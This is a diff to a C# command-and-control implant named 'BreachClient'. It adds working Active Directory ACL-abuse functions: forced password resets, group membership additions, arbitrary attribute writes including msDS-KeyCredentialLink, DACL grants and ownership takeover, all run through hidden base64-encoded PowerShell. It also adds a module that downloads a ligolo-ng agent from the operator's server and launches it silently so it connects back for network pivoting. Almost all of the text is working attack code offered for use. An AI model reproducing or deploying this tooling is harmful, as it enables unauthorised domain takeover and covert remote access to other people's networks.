@@ -81,6 +81,8 @@ namespace BreachClient
                     "secretsdump"  => await RunDownloadAndExec(instruction),
                     "dpapi"        => await RunDownloadAndExec(instruction),
                     "authenticate" => RunAuthenticate(instruction),
+                    "aclabuse"     => RunAclAbuse(instruction),
+                    "pivot"        => await RunPivotAgent(instruction),
                     _              => ExecuteCommand(instruction)
                 };
 
@@ -411,6 +413,159 @@ namespace BreachClient
             return ExecuteCommand(
                 $"wmic /node:{target} /user:{username} /password:\"{password}\" process list brief"
             );
+        }
+
+        // ── ACL abuse module ──────────────────────────────────────────────────────
+
+        /// <summary>
+        /// Execute an Active Directory ACL abuse operation via PowerShell ADSI.
+        /// Instruction wire format: "op|arg1|arg2[|arg3]"
+        ///   addmember           group|user
+        ///   forcechangepassword user|newpassword
+        ///   genericwrite        target_sam|attribute|value
+        ///   writedacl           target_sam|principal_sam|right
+        ///   writeowner          target_sam|new_owner_sam
+        /// </summary>
+        static string RunAclAbuse(string instruction)
+        {
+            var parts = instruction.Split('|');
+            if (parts.Length < 2)
+                return "[error] Invalid aclabuse instruction — expected: op|arg1|arg2...";
+
+            return parts[0].ToLower() switch
+            {
+                "addmember"           => AclAddMember(parts),
+                "forcechangepassword" => AclForceChangePassword(parts),
+                "genericwrite"        => AclGenericWrite(parts),
+                "writedacl"           => AclWriteDacl(parts),
+                "writeowner"          => AclWriteOwner(parts),
+                _                     => $"[error] Unknown ACL abuse operation: {parts[0]}"
+            };
+        }
+
+        /// <summary>
+        /// Run a PowerShell script via -EncodedCommand (UTF-16 LE base64) to avoid
+        /// any cmd.exe escaping issues. Returns combined stdout / stderr.
+        /// </summary>
+        static string RunPowerShell(string script)
+        {
+            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
+            var psi = new ProcessStartInfo
+            {
+                FileName               = "powershell.exe",
+                Arguments              = $"-NoProfile -NonInteractive -EncodedCommand {b64}",
+                RedirectStandardOutput = true,
+                RedirectStandardError  = true,
+                UseShellExecute        = false,
+                CreateNoWindow         = true,
+            };
+            using var proc = Process.Start(psi)!;
+            string stdout = proc.StandardOutput.ReadToEnd();
+            string stderr = proc.StandardError.ReadToEnd();
+            proc.WaitForExit();
+            return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
+        }
+
+        // addmember|<group>|<user>
+        static string AclAddMember(string[] p)
+        {
+            if (p.Length < 3) return "[error] addmember: requires group|user";
+            return ExecuteCommand($"net group \"{p[1]}\" \"{p[2]}\" /add /domain");
+        }
+
+        // forcechangepassword|<user>|<newpassword>
+        static string AclForceChangePassword(string[] p)
+        {
+            if (p.Length < 3) return "[error] forcechangepassword: requires user|newpassword";
+            string script = string.Format(
+                @"$u = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
+$u.Invoke('SetPassword', '{1}')
+$u.CommitChanges()
+'[+] Password changed for {0}'",
+                p[1], p[2]);
+            return RunPowerShell(script);
+        }
+
+        // genericwrite|<target_sam>|<attribute>|<value>
+        // Writes a string attribute on any AD object (user, group, computer).
+        // Common targets: scriptPath, servicePrincipalName, msDS-KeyCredentialLink
+        static string AclGenericWrite(string[] p)
+        {
+            if (p.Length < 4) return "[error] genericwrite: requires target|attribute|value";
+            string script = string.Format(
+                @"$obj = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
+$obj.Put('{1}', '{2}')
+$obj.CommitChanges()
+'[+] Wrote {1}={2} on {0}'",
+                p[1], p[2], p[3]);
+            return RunPowerShell(script);
+        }
+
+        // writedacl|<target_sam>|<principal_sam>|<right>
+        // Grants an ActiveDirectoryRights right to principal over target.
+        // Common rights: GenericAll, GenericWrite, WriteDacl, WriteOwner, ResetPassword
+        static string AclWriteDacl(string[] p)
+        {
+            if (p.Length < 4) return "[error] writedacl: requires target|principal|right";
+            string script = string.Format(
+                @"$tgt = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
+$prin = ([adsisearcher]'(sAMAccountName={1})').FindOne()
+$sid = New-Object System.Security.Principal.SecurityIdentifier($prin.Properties['objectSid'][0], 0)
+$right = [System.DirectoryServices.ActiveDirectoryRights]::{2}
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, $right, [System.Security.AccessControl.AccessControlType]::Allow)
+$tgt.ObjectSecurity.AddAccessRule($ace)
+$tgt.CommitChanges()
+'[+] Granted {2} to {1} over {0}'",
+                p[1], p[2], p[3]);
+            return RunPowerShell(script);
+        }
+
+        // writeowner|<target_sam>|<new_owner_sam>
+        // Takes ownership of an AD object — typically followed by writedacl GenericAll.
+        static string AclWriteOwner(string[] p)
+        {
+            if (p.Length < 3) return "[error] writeowner: requires target|new_owner";
+            string script = string.Format(
+                @"$tgt = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
+$own = ([adsisearcher]'(sAMAccountName={1})').FindOne()
+$sid = New-Object System.Security.Principal.SecurityIdentifier($own.Properties['objectSid'][0], 0)
+$tgt.ObjectSecurity.SetOwner($sid)
+$tgt.CommitChanges()
+'[+] Ownership of {0} set to {1}'",
+                p[1], p[2]);
+            return RunPowerShell(script);
+        }
+
+        // ── Pivot / ligolo-ng agent deployment ───────────────────────────────────
+
+        /// <summary>
+        /// Download agent.exe from /files/ and launch it detached so it connects
+        /// back to the ligolo-ng proxy on the operator machine.
+        /// Instruction format: "ip:port"  (e.g. "192.168.10.4:11601")
+        /// The process runs in the background — the beacon loop continues normally.
+        /// </summary>
+        static async Task<string> RunPivotAgent(string connectAddr)
+        {
+            string? agentPath = await DownloadTool("agent.exe");
+            if (agentPath == null)
+                return "[error] Failed to download agent.exe — place it in server/files/";
+
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName        = agentPath,
+                    Arguments       = $"-connect {connectAddr} -ignore-cert",
+                    UseShellExecute = false,
+                    CreateNoWindow  = true,
+                };
+                var proc = Process.Start(psi)!;
+                return $"[+] ligolo-ng agent started (PID {proc.Id}), connecting to {connectAddr}";
+            }
+            catch (Exception e)
+            {
+                return $"[exec error] {e.Message}";
+            }
         }
 
         // ── Lateral movement (disabled — re-enable when BH integration is ready) ──
